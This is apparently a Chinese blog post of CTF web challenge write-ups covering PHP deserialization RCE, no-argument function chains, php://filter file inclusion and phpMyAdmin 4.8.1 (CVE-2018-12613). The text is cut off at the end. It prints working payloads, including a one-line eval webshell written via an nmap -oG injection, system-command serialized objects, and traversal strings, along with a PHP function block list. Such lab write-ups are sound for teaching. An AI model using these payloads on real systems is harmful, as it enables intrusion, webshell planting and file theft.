<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;&#x27;</span> <span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span> -oG <span class="number">1</span>.php <span class="string">&#x27;\&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;\\&#x27;</span><span class="string">&#x27; \&lt;\?php eval\(\$_POST\[1\]\)\;\?\&gt; -oG 1.php &#x27;</span>\\<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">  // 根据shell的解析规则</span></span><br><span class="line"><span class="string">\ &lt;?php eval($_POST[1]);?&gt; 1.php \\</span></span><br><span class="line"><span class="string">这样的话结果还是被写入了1.php</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>如何在最后的单引号前面不加空格，那么最后文件名会是<code>1.php\\</code>，这边成对的单引号是可以消掉的，<code>&#39;\\&#39;&#39;&#39;</code>中，后两个单引号配对为空，前面2个单引号包裹<code>\\</code>所以最后就是<code>\\</code>，不进行转义<br>最后访问给的文件夹地址rce即可<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665752941475-f3fe98c5-97ad-42f6-81bd-16412a10ff3e.png#averageHue=%23959595&clientId=u9c486b39-dc87-4&from=paste&height=582&id=u0a9dc2a0&name=image.png&originHeight=728&originWidth=1676&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62390&status=done&style=none&taskId=u197d3c8c-4de0-42e9-b695-e5a0f42dbd5&title=&width=1340.8" alt="image.png"></p>
<h2 id="网鼎杯-2020-朱雀组-phpweb（反序列化-RCE"><a href="#网鼎杯-2020-朱雀组-phpweb（反序列化-RCE" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb（反序列化+RCE)"></a>[网鼎杯 2020 朱雀组]phpweb（反序列化+RCE)</h2><p>进入靶场，看见一张司马脸，一开始以为是野兽，结果是孙笑川尼玛的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665811629289-9f2444a1-e34b-4416-953f-ddcf0dab9421.png#averageHue=%23a3af9d&clientId=u5081ce19-3e6b-4&from=paste&id=u87e565be&name=image.png&originHeight=995&originWidth=1914&originalType=url&ratio=1&rotation=0&showTitle=false&size=2193317&status=done&style=none&taskId=u89dfcb77-9e59-4914-b908-f23cf7d501d&title=" alt="image.png"><br>普通界面啥也没有，我们打开检查后发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665811625744-c4c3b9f7-434b-48f5-b178-886b1c2525bd.png#averageHue=%23d9ab73&clientId=u5081ce19-3e6b-4&from=paste&id=ub980ac18&name=image.png&originHeight=102&originWidth=636&originalType=url&ratio=1&rotation=0&showTitle=false&size=10819&status=done&style=none&taskId=u4445dbf3-6958-4b2f-ba5c-0a67f663288&title=" alt="image.png"><br>这里有2个POST传递的参数，func和p：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665811625920-51b752ca-4248-48a3-8aae-53808432a854.png#averageHue=%23f7f6f6&clientId=u5081ce19-3e6b-4&from=paste&id=u87254ec5&name=image.png&originHeight=333&originWidth=881&originalType=url&ratio=1&rotation=0&showTitle=false&size=36887&status=done&style=none&taskId=ud43e586c-32da-4521-9aaf-34676bc2353&title=" alt="image.png"></p>
<ul>
<li>data：函数用于格式化时间&#x2F;日期。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo date(<span class="string">&quot;Y/m/d&quot;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">echo date(<span class="string">&quot;Y.m.d&quot;</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">echo date(<span class="string">&quot;Y-m-d&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
以上函数输出：<blockquote>
<p>2016&#x2F;10&#x2F;21<br>2016.10.21<br>2016-10-21</p>
</blockquote>
</li>
</ul>
<p>可以知道网页中执行了data（Y-m-d+h:i:s+a）函数，那我们不妨猜想一下假如把data换成其他函数比如eval，system之类的呢<br>我们首先读取一下源码，payload：func&#x3D;highlight_file&amp;p&#x3D;index.php<br>得到了以下源码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span></span><br><span class="line">  <span class="variable">$disable_fun</span> <span class="operator">=</span> array(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">  function <span class="title function_">gettime</span><span class="params">($func, $p)</span> &#123;</span><br><span class="line">      $result = call_user_func($func, $p);</span><br><span class="line">      $a= gettype($result);</span><br><span class="line">      <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> $result;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">      <span class="type">var</span> <span class="variable">$p</span> <span class="operator">=</span> <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">      <span class="type">var</span> <span class="variable">$func</span> <span class="operator">=</span> <span class="string">&quot;date&quot;</span>;</span><br><span class="line">      function <span class="title function_">__destruct</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> ($<span class="built_in">this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">              echo <span class="title function_">gettime</span><span class="params">($<span class="built_in">this</span>-&gt;func, $<span class="built_in">this</span>-&gt;p)</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">  $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">      $func = strtolower($func);</span><br><span class="line">      <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">          echo <span class="title function_">gettime</span><span class="params">($func, $p)</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">          die(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>call_user_func():函数会将第一个参数当作回调函数使用</li>
</ul>
<p>exp:call_user_func($a,$b)等价于$a($b)</p>
<ul>
<li>gettype:获得参数的类型</li>
<li>strtolower：把字符都改成小写</li>
<li>in_array():查看字符串中有没有指定字符</li>
</ul>
<p>从源码可以得知，首先ban掉了一大堆函数，里面有一个自定义函数gettime：里面有call_user_func函数，可以执行命令；新建了一个类Test，里面可以再次调用gettime函数，最后传2个参数func和p，如果func不为空且func中没有被禁用的函数，那么就运行gettime函数<br>分析：假如单单func和p传入一个system，ls这样肯定不行，因为system被ban了，很多执行命令的函数给ban掉了，我们看到里面有个类就应该想起反序列化，这题我们得调用Test类进行两次gettime函数的利用，来绕过过滤<br>构造本地文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">P <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果：<br>O:4:”Test”:2:{s:1:”p”;s:2:”ls”;s:4:”func”;s:6:”system”;}<br>我们输入func&#x3D;unserialize&amp;p&#x3D;O:4:”Test”:2:{s:1:”p”;s:2:”ls”;s:4:”func”;s:6:”system”;}：<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665811625939-f82b7a66-0fe9-4b4f-90fd-606c8fc6ca9b.png#averageHue=%238499ac&clientId=u5081ce19-3e6b-4&from=paste&id=ufbe017cd&name=image.png&originHeight=148&originWidth=408&originalType=url&ratio=1&rotation=0&showTitle=false&size=48957&status=done&style=none&taskId=uffcb0270-5906-4d5c-86df-94689569847&title=" alt="image.png"><br>发现当前目录没有flag文件，这时候我们就要用到一个linux指令:</p>
<ul>
<li>find：<blockquote>
<p>-mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件<br>-amin n : 在过去 n 分钟内被读取过<br>-anewer file : 比文件 file 更晚被读取过的文件<br>-atime n : 在过去 n 天内被读取过的文件<br>-cmin n : 在过去 n 分钟内被修改过<br>-cnewer file :比文件 file 更新的文件<br>-ctime n : 在过去 n 天内创建的文件<br>-mtime n : 在过去 n 天内修改过的文件<br>-empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name<br>-ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写<br>-name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写<br>-size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。<br>-type c : 文件类型是 c 的文件。<br>d: 目录<br>c: 字型装置文件<br>b: 区块装置文件<br>p: 具名贮列<br>f: 一般文件<br>l: 符号连结<br>s: socket</p>
</blockquote>
</li>
</ul>
<p>这里使用指令 find &#x2F; -name flag*:查找根目录所有名称包括flag的文件<br>把上述本地文件中的p改为find &#x2F; -name flag<em>，构造payload：<br>func&#x3D;unserialize&amp;p&#x3D;O:4:”Test”:2:{s:1:”p”;s:18:”find &#x2F; -name flag</em>“;s:4:”func”;s:6:”system”;}<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665811625942-1c538d20-eca0-40c6-97c2-3c8050fdad67.png#averageHue=%23ececec&clientId=u5081ce19-3e6b-4&from=paste&id=u27b0573e&name=image.png&originHeight=254&originWidth=610&originalType=url&ratio=1&rotation=0&showTitle=false&size=20246&status=done&style=none&taskId=ub736b0f9-6460-4829-b9ed-588a44e8fe2&title=" alt="image.png"><br>这么多带有flag的文件名，观察可以得出flag应该在&#x2F;tmp&#x2F;flagoefiu4r93目录下<br>把p改为：tac &#x2F;tmp&#x2F;flagoefiu4r93<br>构造payload：<br>func&#x3D;unserialize&amp;p&#x3D;O:4:”Test”:2:{s:1:”p”;s:22:”tac &#x2F;tmp&#x2F;flagoefiu4r93”;s:4:”func”;s:6:”system”;}<br>    <img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665811626503-7edd836e-a1a6-461f-8573-f09e5c35dcf8.png#averageHue=%23c8ae80&clientId=u5081ce19-3e6b-4&from=paste&id=u29285ce4&name=image.png&originHeight=583&originWidth=1037&originalType=url&ratio=1&rotation=0&showTitle=false&size=304867&status=done&style=none&taskId=u6e2655cc-6367-4202-ae42-41f667df829&title=" alt="image.png"><br>得到了flag！<br><strong>遇到的一些问题:本人尝试过用一句话木马看看能不能连接到后台，因为这样找文件可能有点麻烦，但是在测试的过程中，首先可以从上一题知道不能直接func&#x3D;eval这种形式去写一句话木马，所以我用了assert(eval($_POST[1]))</strong><br><strong>可是这仍然行不通，猜测可能是当前页面没有开启assert</strong></p>
<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>页面啥也没有，扫目录发现有git文件，我们用githack下载了，发现了源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>似曾相识，正则里面有个递归正则，意思就是只让我们用字母和括号组成的函数来构造<br>直接上payload了：<br><code>?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665812949245-cd945d75-a0f1-45e7-9ceb-1ac9105fe148.png#averageHue=%23fbf8f6&clientId=u74ad7173-a919-4&from=paste&height=126&id=uc94c2b4c&name=image.png&originHeight=157&originWidth=697&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14017&status=done&style=none&taskId=u61c35e92-dc01-40da-889e-7503a054cfd&title=&width=557.6" alt="image.png"><br>没啥好说的</p>
<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665813902327-9ceee876-3019-4517-a56a-bbf4864e9d85.png#averageHue=%23dcbf97&clientId=u74ad7173-a919-4&from=paste&height=506&id=u58894e29&name=image.png&originHeight=632&originWidth=1789&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33311&status=done&style=none&taskId=u9cd12071-c023-449f-af36-d3e4de462f9&title=&width=1431.2" alt="image.png"><br>好了！锻炼英语的时候到了，翻译内容如下：<br><strong>今天可好？有什么不顺的事情吗？心情很低落吗？点下面的按钮让这些可爱的图片治愈你！</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665813982726-7f81f2af-a315-4412-89ee-fd4aefbed492.png#averageHue=%23698248&clientId=u74ad7173-a919-4&from=paste&height=730&id=u6a6ed490&name=image.png&originHeight=912&originWidth=1833&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1215580&status=done&style=none&taskId=u19ab7547-442f-44e1-be57-ed0567aea25&title=&width=1466.4" alt="image.png"><br>伯恩山呜呜呜，我也想养一只<br>看浏览器参数，多了个catagory，这边我以为是SQL注入，加了个单引号后：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665814016903-fbe92eb1-8948-41e2-8f61-3aabf2ddc8dc.png#averageHue=%23fbfaf9&clientId=u74ad7173-a919-4&from=paste&height=274&id=u9e8d1a8d&name=image.png&originHeight=343&originWidth=1370&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44330&status=done&style=none&taskId=u14a0aace-ceed-4e02-a5ad-02836c1bd8d&title=&width=1096" alt="image.png"><br>看到include吗，这是文件包含题，经过测试，我们的参数里必须要有woofers或者meowers，也就是给定的2个参数，并且啊结尾会自动填上一个<code>.php</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665814198571-a50077ab-7e30-4519-9f18-849c980dccb9.png#averageHue=%23daba8e&clientId=u74ad7173-a919-4&from=paste&height=542&id=u56edc9e3&name=image.png&originHeight=678&originWidth=1406&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64490&status=done&style=none&taskId=ue839b0af-577b-49e8-b161-482fbc421a2&title=&width=1124.8" alt="image.png"><br>构造payload读取源文件；<br><code>php://filter/convert.base64-encode/resource=index</code><br>可以读取，这边应该是字符串中有index也可以</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">				<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到源代码了，经过目录扫描，存在flag.php<br>构造payload：<br><code>php://filter/convert.base64-encode|woofers/resource=flag</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665814444917-7cdf66c9-debc-40bb-98e3-319b21e0f271.png#averageHue=%23fcfbfa&clientId=u74ad7173-a919-4&from=paste&height=141&id=u89390b9d&name=image.png&originHeight=176&originWidth=1360&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28052&status=done&style=none&taskId=u1f847715-c931-4488-996a-50949e178ca&title=&width=1088" alt="image.png"></p>
<p>想尝试data可是行不通，没开启allow_url_include<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665814696680-1cffd260-8448-466e-9b1a-14b9f5dd4748.png#averageHue=%23aaa9a9&clientId=u3ded09a2-be55-4&from=paste&height=501&id=u9b934b41&name=image.png&originHeight=626&originWidth=1729&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97776&status=done&style=none&taskId=u609a49ef-0ef0-42d4-a685-6626997b1a9&title=&width=1383.2" alt="image.png"></p>
<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665821650980-a1dd6e27-b35a-4ef8-a941-25728f9c8d97.png#averageHue=%23f3f3f2&clientId=u066d4389-ccc7-4&from=paste&height=253&id=ub0038c2c&name=image.png&originHeight=316&originWidth=1697&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60594&status=done&style=none&taskId=u73b31f0d-eb28-4ffe-b996-f908fed1284&title=&width=1357.6" alt="image.png"><br>这段话是啥不重要，重要的是用dirsearch扫出来了robots.txth和phpmyadmin：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665821688499-8114b3f6-02cb-4dfe-acdf-32dfe26b3791.png#averageHue=%23e7d1b6&clientId=u066d4389-ccc7-4&from=paste&height=106&id=u40b08a2d&name=image.png&originHeight=133&originWidth=1110&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10776&status=done&style=none&taskId=u254e53b2-594a-45e9-96fd-e5f203b094c&title=&width=888" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665821694282-b0eb5317-f0ff-4a79-801b-e1e417e798e3.png#averageHue=%23bacabd&clientId=u066d4389-ccc7-4&from=paste&height=206&id=u9a9e2b54&name=image.png&originHeight=258&originWidth=1534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42669&status=done&style=none&taskId=u7dc67eba-5313-4c44-88c5-3db1d88758c&title=&width=1227.2" alt="image.png"><br>这里没啥东西感觉<br>重点在phpmyadmin：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665821721702-cdc1b733-dae2-4e4b-80e4-a662fc2a416e.png#averageHue=%23eae9e8&clientId=u066d4389-ccc7-4&from=paste&height=742&id=ud67ae5b6&name=image.png&originHeight=927&originWidth=1708&originalType=binary&ratio=1&rotation=0&showTitle=false&size=204364&status=done&style=none&taskId=uf7425add-5fef-498d-a84d-11ae78d034d&title=&width=1366.4" alt="image.png"><br>看phpmyadmin的版本，4.8.1，这里存在一个<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0d75017c154f">phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613） - 简书</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">【首发】phpmyadmin4.8.1后台getshell</a><br>把这两个看完你会焕然一新，这个CVE出现在index界面，你会发现poc和**[HCTF 2018]WarmUp**一模一样<br>所以我就直接上payload了：<br><code>?target=db_sql.php%253f/../../../../../../../../flag</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665821878319-e91b21b1-0eb4-4a90-abd3-7552ff2b41f8.png#averageHue=%23e1bc80&clientId=u066d4389-ccc7-4&from=paste&height=138&id=udee6c338&name=image.png&originHeight=173&originWidth=1699&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68310&status=done&style=none&taskId=u9dda209c-3420-4e82-a704-787b83a8c05&title=&width=1359.2" alt="image.png"><br>上面还有个getshell的文章,就是不清楚这个安装目录不然也可以getshell</p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>用dirsearch扫出git，下载源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;	<span class="comment">//GET方式传flag只能传一个flag=flag</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;	<span class="comment">//GET和POST其中之一必须传flag</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 